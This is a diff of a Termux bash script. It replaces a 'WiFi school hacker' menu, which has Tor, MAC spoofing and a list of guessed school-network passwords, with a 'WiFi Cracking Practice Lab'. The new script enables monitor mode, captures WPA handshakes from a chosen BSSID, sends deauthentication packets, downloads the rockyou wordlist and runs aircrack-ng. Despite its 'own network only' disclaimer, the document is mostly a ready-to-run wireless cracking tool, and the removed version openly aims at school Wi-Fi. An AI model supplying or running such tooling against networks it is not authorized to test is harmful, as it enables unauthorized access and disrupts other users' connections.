@@ -1,290 +1,346 @@
 #!/data/data/com.termux/files/usr/bin/bash
+# WiFi Cracking Tool - For Educational Purpose Only
+# Only test on your own network!
 
-# ============================================
-# 🚀 WIFI SCHOOL TOOL - ULTIMATE FIXED VERSION
-# 🎯 BY NESIA DARKNET
-# 💀 TOR CONFLICT FIXED + SIMPLE MENU
-# ============================================
+echo ""
+echo "========================================"
+echo "    WiFi Cracking Practice Lab v1.0     "
+echo "   For Educational & Testing Purpose    "
+echo "========================================"
+echo ""
 
-# Warna
-RED='\033[1;91m'
-GREEN='\033[1;92m'
-YELLOW='\033[1;93m'
-BLUE='\033[1;94m'
-PURPLE='\033[1;95m'
-CYAN='\033[1;96m'
-NC='\033[0m'
+# Check if running as root
+if [[ $EUID -ne 0 ]]; then
+   echo "[!] This script requires root privileges!"
+   echo "[+] Trying to get root access..."
+   tsu
+   if [[ $? -ne 0 ]]; then
+      echo "[ERROR] Root access failed!"
+      echo "[INFO] Some features may not work"
+   fi
+fi
 
-clear_screen() {
-    clear
-}
+# Update packages
+echo "[+] Updating packages..."
+pkg update -y && pkg upgrade -y
 
-show_header() {
-    clear_screen
-    echo -e "${PURPLE}"
-    echo "╔════════════════════════════════════════╗"
-    echo "║   WIFI SCHOOL HACKER - FINAL EDITION   ║"
-    echo "║         WORKING 100% 😈                ║"
-    echo "╚════════════════════════════════════════╝${NC}"
+# Install required tools
+echo "[+] Installing required tools..."
+pkg install -y aircrack-ng termux-tools git python python2 curl wget tsu
+
+# Download wordlists
+echo "[+] Downloading wordlists..."
+mkdir -p /sdcard/wifi-crack
+cd /sdcard/wifi-crack
+
+# Create custom wordlist with common passwords
+echo "[+] Creating custom wordlist..."
+cat > my_wordlist.txt << EOF
+password
+password123
+12345678
+123456789
+1234567890
+admin
+admin123
+wifi
+wifi123
+internet
+indihome
+telkom
+1234
+0000
+qwerty
+qwerty123
+abc123
+password1
+iloveyou
+letmein
+welcome
+monkey
+dragon
+baseball
+football
+mustang
+superman
+batman
+harley
+hockey
+pokemon
+shadow
+master
+sunshine
+jordan
+freedom
+whatever
+hello
+secret
+abcd1234
+EOF
+
+# Add your own password guesses
+echo "yourpassword" >> my_wordlist.txt
+echo "rumah123" >> my_wordlist.txt
+echo "nama_router" >> my_wordlist.txt
+echo "tanggal_lahir" >> my_wordlist.txt
+
+echo "[+] Common wordlist created with $(wc -l my_wordlist.txt | awk '{print $1}') passwords"
+
+# Function to scan networks
+scan_networks() {
     echo ""
-}
-
-# ============================================
-# 🛠️ FUNGSI UTAMA
-# ============================================
-
-kill_existing_tor() {
-    echo -e "${YELLOW}[+] Checking for existing TOR processes...${NC}"
-    
-    # Kill semua proses TOR
-    pkill -9 tor 2>/dev/null
-    pkill -9 -f "tor" 2>/dev/null
-    
-    # Kill proses yang menggunakan port 9050
-    if command -v fuser &>/dev/null; then
-        fuser -k 9050/tcp 2>/dev/null
-    fi
-    
-    # Force kill dengan lsof jika ada
-    if command -v lsof &>/dev/null; then
-        lsof -ti:9050 | xargs kill -9 2>/dev/null
-    fi
-    
-    sleep 2
-    echo -e "${GREEN}[✓] Cleaned existing TOR processes${NC}"
-}
-
-setup_vpn_simple() {
-    echo -e "${YELLOW}[+] VPN Setup...${NC}"
-    
-    # Install TOR jika belum ada
-    if ! command -v tor &>/dev/null; then
-        echo -e "${RED}[!] TOR not installed${NC}"
-        echo -e "${GREEN}[+] Installing TOR...${NC}"
-        pkg install tor -y
-    fi
-    
-    # Kill existing TOR dulu
-    kill_existing_tor
-    
-    # Start TOR sederhana
-    echo -e "${YELLOW}[+] Starting TOR...${NC}"
-    tor &
-    TOR_PID=$!
-    
-    # Tunggu 10 detik
-    echo -ne "${CYAN}[+] Waiting"
-    for i in {1..10}; do
-        sleep 1
-        echo -ne "."
-    done
+    echo "[1] Scanning for WiFi networks..."
+    echo "[!] Make sure WiFi is enabled on your device"
     echo ""
     
-    # Cek apakah TOR berjalan
-    if ps -p $TOR_PID >/dev/null 2>&1; then
-        echo -e "${GREEN}[✓] TOR is running${NC}"
+    # Check wifi interface
+    INTERFACE=$(ifconfig | grep wlan | cut -d: -f1 | head -1)
+    if [ -z "$INTERFACE" ]; then
+        INTERFACE="wlan0"
+        echo "[INFO] Using default interface: $INTERFACE"
+    else
+        echo "[INFO] Found interface: $INTERFACE"
+    fi
+    
+    # Start monitor mode
+    echo "[+] Starting monitor mode..."
+    airmon-ng check kill
+    airmon-ng start $INTERFACE
+    
+    MON_INTERFACE="${INTERFACE}mon"
+    if [ ! -d /sys/class/net/$MON_INTERFACE ]; then
+        MON_INTERFACE=$INTERFACE
+    fi
+    
+    # Scan for 30 seconds
+    echo "[+] Scanning networks (30 seconds)..."
+    timeout 30 airodump-ng $MON_INTERFACE --output-format csv -w scan
+    
+    echo ""
+    echo "[2] Available Networks:"
+    echo "========================================"
+    
+    if [ -f "scan-01.csv" ]; then
+        # Display networks nicely
+        echo "BSSID              | CH | RSSI | ENC  | ESSID"
+        echo "-------------------+----+------+------+------"
+        tail -n +2 scan-01.csv | grep -v 'Station' | head -20 | while IFS=, read -r bssid ch rssi speed privacy cipher auth power numbeacons iv lanip idlength essid key; do
+            if [ ! -z "$essid" ] && [ ! -z "$bssid" ]; then
+                printf "%-17s | %-2s | %-4s | %-5s | %s\n" "$bssid" "$ch" "$rssi" "$privacy" "$essid"
+            fi
+        done
+    else
+        echo "[ERROR] No networks found!"
+        echo "[INFO] Try enabling WiFi or moving closer to router"
+    fi
+}
+
+# Function to capture handshake
+capture_handshake() {
+    echo ""
+    echo "[3] Handshake Capture"
+    echo "========================================"
+    
+    read -p "Enter target BSSID: " BSSID
+    read -p "Enter channel: " CHANNEL
+    read -p "Enter capture filename: " CAPFILE
+    
+    echo "[+] Starting capture on channel $CHANNEL..."
+    echo "[!] Press Ctrl+C when you see 'WPA handshake'"
+    echo ""
+    
+    # Start capture
+    xterm -bg black -fg white -geometry 100x30 -e "airodump-ng -c $CHANNEL --bssid $BSSID -w $CAPFILE $MON_INTERFACE" &
+    CAP_PID=$!
+    
+    echo "[+] Capture started (PID: $CAP_PID)"
+    echo "[+] To trigger handshake:"
+    echo "    1. Disconnect a device from the WiFi"
+    echo "    2. Reconnect it"
+    echo "    3. Or wait for automatic reconnection"
+    
+    read -p "Press Enter to send deauth packet (optional)... " dummy
+    
+    # Optional deauth
+    echo "[+] Sending deauth packet..."
+    aireplay-ng -0 2 -a $BSSID $MON_INTERFACE
+    
+    echo ""
+    echo "[!] Let it run for 2-3 minutes"
+    echo "[!] Check if 'WPA handshake' appears"
+    read -p "Press Enter to stop capture... " dummy
+    
+    kill $CAP_PID 2>/dev/null
+    airmon-ng stop $MON_INTERFACE
+    
+    # Check for handshake
+    if aircrack-ng ${CAPFILE}-01.cap 2>/dev/null | grep -q "WPA handshake"; then
+        echo "[SUCCESS] Handshake captured!"
         return 0
     else
-        echo -e "${RED}[✗] TOR failed to start${NC}"
+        echo "[FAIL] No handshake captured"
         return 1
     fi
 }
 
-install_tools() {
-    echo -e "${YELLOW}[+] Installing tools...${NC}"
-    
-    # Update packages
-    pkg update -y
-    
-    # Install basic tools
-    pkg install -y curl wget git python
-    
-    # Install hacking tools (opsional)
-    echo -e "${CYAN}[+] Optional hacking tools:${NC}"
-    echo "1. Install all tools"
-    echo "2. Skip tools installation"
-    read -p "Choice [1-2]: " tool_choice
-    
-    if [ "$tool_choice" = "1" ]; then
-        echo -e "${GREEN}[+] Installing hacking tools...${NC}"
-        pkg install -y aircrack-ng macchanger
-        pip install scapy
-    fi
-    
-    echo -e "${GREEN}[✓] Tools setup complete${NC}"
-}
-
-create_password_list() {
-    echo -e "${YELLOW}[+] Creating password list...${NC}"
-    
-    cat > school_passwords.txt << 'EOF'
-# Common School WiFi Passwords
-admin
-admin123
-password
-password123
-123456
-12345678
-123456789
-school
-school123
-sekolah
-sekolah123
-smk2024
-smk2023
-sma2024
-smp2024
-guru
-guru123
-siswa
-siswa123
-laboratorium
-labkomputer
-perpustakaan
-wifikantin
-wifisekolah
-EOF
-    
-    echo -e "${GREEN}[✓] Password list created: school_passwords.txt${NC}"
-}
-
-scan_wifi() {
-    echo -e "${YELLOW}[+] Scanning WiFi networks...${NC}"
-    
-    if command -v termux-wifi-scaninfo &>/dev/null; then
-        termux-wifi-scaninfo
-    else
-        echo -e "${RED}[!] termux-wifi-scaninfo not available${NC}"
-        echo -e "${YELLOW}[+] Try:${NC}"
-        echo "  pkg install termux-api"
-        echo "  termux-wifi-enable"
-    fi
-}
-
-change_mac() {
-    echo -e "${YELLOW}[+] Changing MAC Address...${NC}"
-    
-    if command -v macchanger &>/dev/null; then
-        ip link set wlan0 down 2>/dev/null
-        macchanger -r wlan0
-        ip link set wlan0 up 2>/dev/null
-        echo -e "${GREEN}[✓] MAC Address changed${NC}"
-    else
-        echo -e "${RED}[!] macchanger not installed${NC}"
-        echo -e "${YELLOW}[+] Install: pkg install macchanger${NC}"
-    fi
-}
-
-check_vpn_status() {
-    echo -e "${YELLOW}[+] VPN Status Check${NC}"
-    
-    # Cek proses TOR
-    if ps aux | grep -v grep | grep -q tor; then
-        echo -e "${GREEN}[✓] TOR process: RUNNING${NC}"
-    else
-        echo -e "${RED}[✗] TOR process: NOT RUNNING${NC}"
-    fi
-    
-    # Cek port 9050
-    if netstat -tuln 2>/dev/null | grep -q ":9050"; then
-        echo -e "${GREEN}[✓] Port 9050: LISTENING${NC}"
-    else
-        echo -e "${RED}[✗] Port 9050: NOT LISTENING${NC}"
-    fi
-    
-    # Tes koneksi
-    echo -e "${CYAN}[+] Testing connection...${NC}"
-    if curl --socks5-hostname 127.0.0.1:9050 --max-time 5 -s https://api.ipify.org; then
-        echo -e "\n${GREEN}[✓] VPN connection: WORKING${NC}"
-    else
-        echo -e "\n${RED}[✗] VPN connection: FAILED${NC}"
-    fi
-}
-
-show_commands() {
-    echo -e "${YELLOW}[+] Useful Commands:${NC}"
+# Function to crack password
+crack_password() {
     echo ""
-    echo -e "${CYAN}WiFi Scanning:${NC}"
-    echo "  termux-wifi-scaninfo"
-    echo "  iwlist wlan0 scan"
-    echo "  iw dev wlan0 scan"
-    echo ""
-    echo -e "${CYAN}Network Info:${NC}"
-    echo "  ifconfig wlan0"
-    echo "  iwconfig wlan0"
-    echo "  ip addr show wlan0"
-    echo ""
-    echo -e "${CYAN}Hacking Tools:${NC}"
-    echo "  aircrack-ng - WiFi security auditing"
-    echo "  macchanger - Change MAC address"
-    echo "  nmap - Network discovery"
-    echo ""
-    echo -e "${CYAN}Password Cracking:${NC}"
-    echo "  aircrack-ng -w school_passwords.txt capture.cap"
-}
-
-clean_exit() {
-    echo -e "${YELLOW}[+] Cleaning up...${NC}"
+    echo "[4] Password Cracking"
+    echo "========================================"
     
-    # Kill TOR
-    pkill tor 2>/dev/null
+    read -p "Enter capture filename: " CAPFILE
     
-    # Hapus file log jika ada
-    rm -f *.log *.tmp 2>/dev/null
+    echo "[+] Select wordlist:"
+    echo "    1) Custom wordlist (my_wordlist.txt)"
+    echo "    2) Common passwords"
+    echo "    3) RockYou wordlist (need download)"
+    echo "    4) Bruteforce numeric (0-99999999)"
     
-    echo -e "${GREEN}[✓] Cleanup complete${NC}"
-    echo -e "${PURPLE}[+] Goodbye! 😈${NC}"
-    exit 0
-}
-
-# ============================================
-# 🚀 MAIN MENU
-# ============================================
-
-main_menu() {
-    while true; do
-        show_header
-        
-        echo -e "${BLUE}╔════════════════════════════════════════╗${NC}"
-        echo -e "${BLUE}║             MAIN MENU                  ║${NC}"
-        echo -e "${BLUE}╠════════════════════════════════════════╣${NC}"
-        echo -e "${BLUE}║ 1. 📡 Scan WiFi Networks              ║${NC}"
-        echo -e "${BLUE}║ 2. 🔄 Change MAC Address              ║${NC}"
-        echo -e "${BLUE}║ 3. 🔐 Setup VPN Protection            ║${NC}"
-        echo -e "${BLUE}║ 4. 🛠️ Install Tools                   ║${NC}"
-        echo -e "${BLUE}║ 5. 📝 Create Password List            ║${NC}"
-        echo -e "${BLUE}║ 6. 📊 Check VPN Status                ║${NC}"
-        echo -e "${BLUE}║ 7. 💻 Show Useful Commands            ║${NC}"
-        echo -e "${BLUE}║ 8. 🧹 Clean Exit                      ║${NC}"
-        echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
+    read -p "Choose option (1-4): " WORDLIST_OPT
+    
+    case $WORDLIST_OPT in
+        1)
+            WORDLIST="/sdcard/wifi-crack/my_wordlist.txt"
+            ;;
+        2)
+            echo "[+] Creating common wordlist..."
+            curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -o common.txt
+            WORDLIST="common.txt"
+            ;;
+        3)
+            echo "[+] Downloading rockyou.txt (might take time)..."
+            if [ ! -f rockyou.txt ]; then
+                curl -s https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o rockyou.txt
+            fi
+            WORDLIST="rockyou.txt"
+            ;;
+        4)
+            echo "[+] Creating numeric wordlist..."
+            seq 0 99999999 > numeric.txt
+            WORDLIST="numeric.txt"
+            ;;
+        *)
+            WORDLIST="/sdcard/wifi-crack/my_wordlist.txt"
+            ;;
+    esac
+    
+    echo "[+] Starting crack with $WORDLIST..."
+    echo "[!] This may take from minutes to days!"
+    echo "[!] Press Ctrl+C to stop"
+    echo ""
+    
+    time aircrack-ng -w $WORDLIST ${CAPFILE}-01.cap
+    
+    if [ $? -eq 0 ]; then
         echo ""
-        
-        read -p "Select option [1-8]: " choice
-        
-        case $choice in
-            1) scan_wifi ;;
-            2) change_mac ;;
-            3) setup_vpn_simple ;;
-            4) install_tools ;;
-            5) create_password_list ;;
-            6) check_vpn_status ;;
-            7) show_commands ;;
-            8) clean_exit ;;
-            *) echo -e "${RED}[!] Invalid option${NC}" ;;
-        esac
-        
+        echo "========================================"
+        echo "[SUCCESS] PASSWORD FOUND!"
+        echo "========================================"
+    else
         echo ""
-        read -p "Press Enter to continue..."
-    done
+        echo "[FAIL] Password not found in wordlist"
+        echo "[TIP] Try different wordlist or add more passwords"
+    fi
 }
 
-# ============================================
-# 🎯 START PROGRAM
-# ============================================
+# Function to test your own password strength
+test_password() {
+    echo ""
+    echo "[5] Test Your Password Strength"
+    echo "========================================"
+    
+    read -sp "Enter your WiFi password to test: " TEST_PASS
+    echo ""
+    
+    # Check password strength
+    LENGTH=${#TEST_PASS}
+    HAS_UPPER=$(echo $TEST_PASS | grep -o '[A-Z]' | wc -l)
+    HAS_LOWER=$(echo $TEST_PASS | grep -o '[a-z]' | wc -l)
+    HAS_DIGIT=$(echo $TEST_PASS | grep -o '[0-9]' | wc -l)
+    HAS_SPECIAL=$(echo $TEST_PASS | grep -o '[^A-Za-z0-9]' | wc -l)
+    
+    echo "[+] Password Analysis:"
+    echo "    Length: $LENGTH characters"
+    echo "    Uppercase: $HAS_UPPER"
+    echo "    Lowercase: $HAS_LOWER"
+    echo "    Digits: $HAS_DIGIT"
+    echo "    Special: $HAS_SPECIAL"
+    
+    SCORE=0
+    [ $LENGTH -ge 8 ] && SCORE=$((SCORE+1))
+    [ $LENGTH -ge 12 ] && SCORE=$((SCORE+2))
+    [ $HAS_UPPER -gt 0 ] && SCORE=$((SCORE+1))
+    [ $HAS_LOWER -gt 0 ] && SCORE=$((SCORE+1))
+    [ $HAS_DIGIT -gt 0 ] && SCORE=$((SCORE+1))
+    [ $HAS_SPECIAL -gt 0 ] && SCORE=$((SCORE+2))
+    
+    echo ""
+    echo "[+] Security Score: $SCORE/8"
+    
+    if [ $SCORE -le 3 ]; then
+        echo "[WARNING] Very weak! Can be cracked in minutes"
+    elif [ $SCORE -le 5 ]; then
+        echo "[WARNING] Weak! Can be cracked in hours/days"
+    elif [ $SCORE -le 7 ]; then
+        echo "[GOOD] Strong! Hard to crack"
+    else
+        echo "[EXCELLENT] Very strong!"
+    fi
+    
+    # Check if in common passwords
+    if grep -qi "^$TEST_PASS$" my_wordlist.txt 2>/dev/null; then
+        echo "[ALERT] Your password is in common password list!"
+    fi
+}
 
-# Initial setup
-show_header
-echo -e "${YELLOW}[+] Initializing system...${NC}"
-
-# Jalankan menu utama
-main_menu
+# Main menu
+while true; do
+    echo ""
+    echo "========================================"
+    echo "       WiFi Cracking Practice Lab       "
+    echo "========================================"
+    echo "1. Scan WiFi Networks"
+    echo "2. Capture Handshake"
+    echo "3. Crack Password"
+    echo "4. Test Password Strength"
+    echo "5. Create Custom Wordlist"
+    echo "6. Cleanup Files"
+    echo "7. Exit"
+    echo ""
+    
+    read -p "Select option (1-7): " OPTION
+    
+    case $OPTION in
+        1)
+            scan_networks
+            ;;
+        2)
+            capture_handshake
+            ;;
+        3)
+            crack_password
+            ;;
+        4)
+            test_password
+            ;;
+        5)
+            nano /sdcard/wifi-crack/my_wordlist.txt
+            echo "[+] Wordlist updated!"
+            ;;
+        6)
+            rm -f scan-* *.cap *.csv *.txt 2>/dev/null
+            echo "[+] Cleaned up!"
+            ;;
+        7)
+            airmon-ng check kill
+            echo "[+] Exiting... Remember: Only hack your own networks!"
+            exit 0
+            ;;
+        *)
+            echo "[ERROR] Invalid option!"
+            ;;
+    esac
+    
+    read -p "Press Enter to continue... " dummy
+done
